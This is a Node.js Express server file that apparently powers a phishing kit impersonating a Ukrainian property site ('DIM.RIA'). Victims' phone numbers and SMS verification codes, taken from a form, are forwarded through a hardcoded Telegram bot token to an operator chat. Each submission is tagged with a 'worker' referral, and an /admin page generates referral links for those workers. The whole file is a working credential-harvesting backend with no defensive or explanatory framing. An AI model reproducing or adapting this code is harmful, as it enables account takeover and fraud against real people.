const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc";
const CHAT_ID = "-5034619533";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
// ==============================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// === АДМИН-ПАНЕЛЬ ДЛЯ ГЕНЕРАЦИИ РЕФ-ССЫЛКИ ===
app.get('/admin', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Генератор Реф-Ссылок</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 40px; text-align: center; }
        .container { max-width: 500px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,255,255,0.2); }
        input, button { padding: 12px; margin: 10px 0; width: 100%; border: none; border-radius: 8px; font-size: 16px; }
        input { background: #0f3460; color: #fff; }
        button { background: #00d4ff; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #00ffcc; }
        .link { margin-top: 20px; word-break: break-all; background: #0f3460; padding: 15px; border-radius: 8px; display: none; }
        .copy-btn { margin-top: 10px; background: #333; color: #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔗 Генератор Реф-Ссылок</h1>
        <p>Введи ник Telegram (без @)</p>
        <input type="text" id="nickname" placeholder="worker123" />
        <button onclick="generateLink()">Создать ссылку</button>
        <div id="result" class="link"></div>
        <button class="copy-btn" onclick="copyLink()" style="display:none;" id="copyBtn">Скопировать</button>
    </div>

    <script>
        function generateLink() {
            const nick = document.getElementById('nickname').value.trim();
            if (!nick) return alert('Введи ник!');

            const baseUrl = window.location.origin;
            const refLink = \`\${baseUrl}/?ref=@\${nick}\`;

            const result = document.getElementById('result');
            const copyBtn = document.getElementById('copyBtn');
            result.textContent = refLink;
            result.style.display = 'block';
            copyBtn.style.display = 'block';

            // Сохраняем реф в localStorage (для формы)
            localStorage.setItem('worker_ref', '@' + nick);
        }

        function copyLink() {
            const link = document.getElementById('result').textContent;
            navigator.clipboard.writeText(link).then(() => {
                alert('Скопировано!');
            });
        }

        // При загрузке страницы — подставляем реф в localStorage, если есть в URL
        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            const ref = urlParams.get('ref');
            if (ref && ref.startsWith('@')) {
                localStorage.setItem('worker_ref', ref);
            }
        };
    </script>
</body>
</html>
    `);
});

// === ГЛАВНАЯ СТРАНИЦА (или редирект на форму) ===
app.get('/', (req, res) => {
    const ref = req.query.ref || '';
    res.sendFile(path.join(__dirname, 'index.html')); // Убедись, что у тебя есть index.html с формой
});

// === ОБРОБКА ДАНИХ З ФОРМИ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, ref } = req.body;

    // Получаем реф из тела запроса или из localStorage (на клиенте)
    const workerRef = ref || 'Не указан';

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина\n*Работник:* ${workerRef}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS:*\n\`${code}\`\n*Работник:* ${workerRef}`;
    } 
    else {
        return res.status(400).json({ success: false, message: 'Невірні дані' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.json({ success: true });
    } else {
        res.status(500).json({ success: false, message: 'Помилка сервера' });
    }
});

// Функция отправки в Telegram
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка Telegram API:', errorData);
            return false;
        }
        return true;
    } catch (error) {
        console.error('Помилка відправки:', error);
        return false;
    }
}

// Запуск
app.listen(port, () => {
    console.log(`Сервер запущено: http://localhost:${port}`);
    console.log(`Админ-панель: http://localhost:${port}/admin`);
});
